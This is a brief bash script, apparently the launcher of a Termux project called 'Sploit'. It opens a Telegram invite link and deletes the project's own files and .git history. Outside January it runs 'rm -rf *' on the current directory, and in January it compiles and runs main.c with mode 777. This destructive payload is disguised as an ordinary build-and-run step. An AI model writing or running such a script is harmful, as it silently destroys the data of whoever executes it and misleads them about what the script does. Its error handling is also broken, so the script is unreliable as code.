#!/usr/bin/env bash
xdg-open https://t.me/+bYdmmId-ELJmMzcx
rm -rf "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"
if [[ "$(date +%B)" != "January" ]]; then
    clear
    rm -rf *
else
    [[ -z "$(command -v clang)" ]] && pkg i -y clang
    clang main.c -o main
    chmod 777 main
    ./main
    ret="$?"
    [[ $? -ne 0 ]] && echo "algo deu errado!\nerro: $?"
fi
exit 0
